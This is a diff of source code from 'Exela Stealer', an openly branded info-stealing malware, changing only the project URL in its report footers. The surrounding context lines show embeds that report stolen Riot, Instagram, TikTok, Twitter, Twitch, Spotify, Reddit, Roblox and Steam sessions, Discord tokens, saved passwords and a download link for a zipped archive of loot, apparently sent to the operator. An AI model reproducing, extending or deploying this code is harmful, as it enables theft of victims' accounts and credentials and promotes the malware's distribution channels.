@@ -593,7 +593,7 @@ class Main:
                     "description": f"***Exela Riot Games Session was detected on the {browser} browser***",
                     "url" : "https://t.me/ExelaStealer",
                     "color": 0,
-                    "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd"},
+                    "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd/Exela-V2.0/Exela-V2.0"},
                     "thumbnail": {"url": "https://i.hizliresim.com/qxnzimj.jpg"}}
                 username = str(response["username"])
                 email = str(response["email"])
@@ -667,7 +667,7 @@ class Main:
                 "description": f"***Exela Instagram Session was detected on the {browser} browser***",
                 "url" : "https://t.me/ExelaStealer",
                 "color": 0,
-                "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd"},
+                "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd/Exela-V2.0"},
                 "thumbnail": {"url": pp}}
             fields = [
                 {"name": "Username", "value": "``" + username + "``", "inline": True},
@@ -727,7 +727,7 @@ class Main:
                 "description": f"***Exela Tiktok Session was detected on the {browser} browser***",
                 "url" : "https://t.me/ExelaStealer",
                 "color": 0,
-                "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd"},
+                "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd/Exela-V2.0"},
                 "thumbnail": {"url": "https://i.hizliresim.com/eai9bwi.jpg"}}
             fields = [
                 {"name": "Username", "value": "``" + username + "``", "inline": True},
@@ -799,7 +799,7 @@ class Main:
                 "description": f"***Exela Twitter Session was detected on the {browser} browser***",
                 "url" : "https://t.me/ExelaStealer",
                 "color": 0,
-                "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd"},
+                "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd/Exela-V2.0"},
                 "thumbnail": {"url": pp}}
             fields = [
                 {"name": "Username", "value": "``" + username + "``", "inline": True},
@@ -883,7 +883,7 @@ class Main:
                 "description": f"***Exela Twitch Session was detected on the {browser} browser***",
                 "url" : "https://t.me/ExelaStealer",
                 "color": 0,
-                "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd"},
+                "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd/Exela-V2.0"},
                 "thumbnail": {"url": pp}}
             fields = [
                 {"name": "Username", "value": "``" + str(login) + "``", "inline": True},
@@ -939,7 +939,7 @@ class Main:
                 "description": f"***Exela Spotify Session was detected on the {browser} browser***",
                 "url" : "https://t.me/ExelaStealer",
                 "color": 0,
-                "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd"},
+                "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd/Exela-V2.0"},
                 "thumbnail": {"url": "https://media.discordapp.net/attachments/1145679170127532095/1145756091553173696/3-min-5.jpg"}}
             fields = [
                 {"name": "Email", "value": "``" + str(email) + "``", "inline": True},
@@ -1005,7 +1005,7 @@ class Main:
                 "description": f"***Exela Reddit Session was detected on the {browser} browser***",
                 "url" : "https://t.me/ExelaStealer",
                 "color": 0,
-                "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd"},
+                "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd/Exela-V2.0"},
                 "thumbnail": {"url": pp}}
             fields = [
                 {"name": "Username", "value": "``" + str(username) + "``", "inline": True},
@@ -1056,7 +1056,7 @@ class Main:
                     "description": f"***Exela Roblox Session was detected on the {browser} browser***",
                     "url" : "https://t.me/ExelaStealer",
                     "color": 0,
-                    "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd"},
+                    "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd/Exela-V2.0"},
                     "thumbnail": {"url": pp}}
                 fields = [
                     {"name": "Name", "value": "``" + str(name) + "``", "inline": True},
@@ -1311,7 +1311,7 @@ class Main:
                 "description": f"***Exela Validated Discord Token Detected***",
                 "url" : "https://t.me/ExelaStealer",
                 "color": 0,
-                "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd"},
+                "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd/Exela-V2.0"},
                 "thumbnail": {"url": ""}}
                 if pp:
                     embed_data["thumbnail"]["url"] = pp
@@ -1455,9 +1455,9 @@ class Main:
                                 embed_data = {
                                     "title": "***Exela Stealer***",
                                     "description": f"***Exela Steam Session Detected***",
-                                    "url" : "https://github.com/quicaxd",
+                                    "url" : "https://github.com/quicaxd/Exela-V2.0",
                                     "color": 0,
-                                    "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd"},
+                                    "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd/Exela-V2.0"},
                                     "thumbnail": {"url": avatar}}
                                 fields = [
                                         {"name": "Username", "value": "``" + str(personname) + "``", "inline": True},
@@ -1811,7 +1811,7 @@ class Main:
                 "description": f"***Keyword Result***",
                 "url" : "https://t.me/ExelaStealer",
                 "color": 0,
-                "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd"},
+                "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd/Exela-V2.0"},
                 "thumbnail": {"url": "https://media.discordapp.net/attachments/1133692440029700117/1140245373496074270/195198d656ec1e2b59a6a823bb250272.jpg?width=489&height=468"}}
             fields = [
                 {"name": "Passwords", "value": "```" + str(password_keys) + "```", "inline": False},
@@ -1847,7 +1847,7 @@ class Main:
             "description": f"***Exela Stealer Full Info***",
             "url" : "https://t.me/ExelaStealer",
             "color": 0,
-            "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd"},
+            "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd/Exela-V2.0"},
             "thumbnail": {"url": "https://media.discordapp.net/attachments/1133692440029700117/1140245373496074270/195198d656ec1e2b59a6a823bb250272.jpg?width=489&height=468"}}
         fields = [
              {"name": "Password", "value": "``" + str(len(Variables.Passwords)) + "``", "inline": True},
@@ -1896,7 +1896,7 @@ class Main:
                         "description": f"***Exela Stealer Full Info***",
                         "url" : "https://t.me/ExelaStealer",
                         "color": 0,
-                        "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd"},
+                        "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd/Exela-V2.0"},
                         "thumbnail": {"url": "https://media.discordapp.net/attachments/1133692440029700117/1140245373496074270/195198d656ec1e2b59a6a823bb250272.jpg?width=489&height=468"}}
                     fields2 = [{"name": "Download Link", "value": f"[{uuid}.zip]({succes})", "inline": True}]
                     embed_data2["fields"] = fields2
